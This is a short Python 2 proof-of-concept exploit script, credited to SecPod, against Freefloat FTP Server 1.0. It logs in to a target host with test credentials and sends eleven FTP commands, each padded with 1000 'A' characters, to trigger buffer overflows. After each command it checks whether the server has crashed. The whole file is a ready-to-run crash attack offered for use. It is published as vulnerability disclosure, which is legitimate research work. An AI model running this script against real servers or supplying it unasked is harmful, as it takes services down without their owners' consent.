#!/usr/bin/python
##############################################################################
# Title     : Freefloat FTP Server Multiple Buffer Overflow Vulnerabilities
# Author    : Veerendra G.G from SecPod Technologies (www.secpod.com)
# Vendor    : http://www.freefloat.com/sv/utilities-tools/utilities-tools.php
# Advisory  : http://secpod.org/blog/?p=310
#             http://secpod.org/SECPOD_FreeFloat_FTP_Server_BoF_PoC.py
#             http://secpod.org/advisories/SECPOD_FreeFloat_FTP_Server_BoF.txt
# Version   : Freefloat FTP Server Version 1.0
# Date      : 21/07/2011
##############################################################################

import sys, socket


def exploit(HOST, PORT, CMD):
    try:
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_sock.connect((HOST, PORT))
    except Exception, msg:
        print "[-] Not able to connect to : " , HOST
        sys.exit(0)

    res = tcp_sock.recv(1024)

    if "220 FreeFloat" not in res:
        print "[-] FreeFloat FTP Server Not Found..."
        tcp_sock.close()
        sys.exit(0)

    tcp_sock.send("USER test\r\n")
    tcp_sock.recv(1024)
    tcp_sock.send("PASS test\r\n")
    tcp_sock.recv(1024)

    tcp_sock.send(CMD + " "+ "A" * 1000 + "\r\n")
    tcp_sock.close()


if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "\t[-] Usage: python exploit.py target_ip"
        print "\t[-] Example : python exploit.py 127.0.0.1"
        print "\t[-] Exiting..."
        sys.exit(0)

    HOST = sys.argv[1]
    PORT = 21

    ## Vulnerable Commands
    CMDs = ["DELE", "MDTM", "RETR", "RMD", "RNFR",
            "RNTO", "STOU", "STOR", "SIZE", "APPE", "STAT"]

    for CMD in CMDs:
        print "[+] Connecting with server..."
        exploit(HOST, PORT, CMD)
        print "[+] Exploit Sent with %s command..." %(CMD)
        print "[+] Checking Server Crashed or not..."

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.close()
        except Exception, msg:
            print "[+] Server Crashed with %s Command" %(CMD)
            sys.exit(0)

